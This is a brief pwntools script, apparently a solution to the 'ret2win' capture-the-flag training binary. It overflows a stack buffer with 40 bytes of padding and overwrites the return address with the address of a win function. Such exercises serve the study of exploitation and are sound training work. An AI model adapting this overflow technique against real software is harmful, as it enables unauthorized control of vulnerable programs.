from pwn import *

p = process('./ret2win')

win = 0x0000000000400811

payload = 'a' * 40
payload += p64(win)

p.sendline(payload)
print p.recvall()
